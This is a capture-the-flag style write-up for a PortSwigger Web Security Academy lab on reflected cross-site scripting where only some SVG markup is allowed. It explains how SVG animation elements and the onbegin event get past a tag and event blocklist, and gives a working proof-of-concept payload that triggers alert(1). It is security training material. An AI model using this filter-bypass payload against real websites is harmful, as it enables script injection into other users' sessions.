# Lab 16: Reflected XSS with some SVG markup allowed

**Category:** Cross-Site Scripting (XSS)  
**Difficulty:** Practitioner  
**Lab link:** [Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)

## Overview

The search functionality reflects input into HTML context, but a WAF blocks most tags and events. However, `<svg>` and some SVG child elements (like `<animatetransform>`) are allowed, along with SVG-specific animation events that HTML WAF rules miss.

## Key Concepts

- **SVG namespace bypass:** WAFs that blocklist HTML tags often miss SVG child elements like `<animatetransform>`, `<animate>`, `<set>`
- **SVG animation events:** `onbegin`, `onend`, `onrepeat` are SVG-specific — they don't exist in HTML, so WAFs that only block HTML events miss them
- **`onbegin` auto-fires:** Fires when the animation timeline starts, which is immediately on render — no user interaction or delivery trick needed

## Solution

1. Fuzz tags with Intruder (`<§§>`) — find `<svg>` and `<animatetransform>` return 200
2. Fuzz events on `<svg><animatetransform §§=1>` — find `onbegin` returns 200
3. Search for:

```
<svg><animatetransform onbegin=alert(1)>
```

Or visit the URL directly:
```
https://LAB-ID.web-security-academy.net/?search=<svg><animatetransform onbegin=alert(1)>
```

## Payload Breakdown

```
<svg><animatetransform onbegin=alert(1)>
```

- `<svg>` — container element; `<animatetransform>` is only valid inside SVG
- `<animatetransform>` — SVG animation element (handles transforms like rotate/scale)
- `onbegin=alert(1)` — SVG animation lifecycle event; fires immediately when the animation starts on render
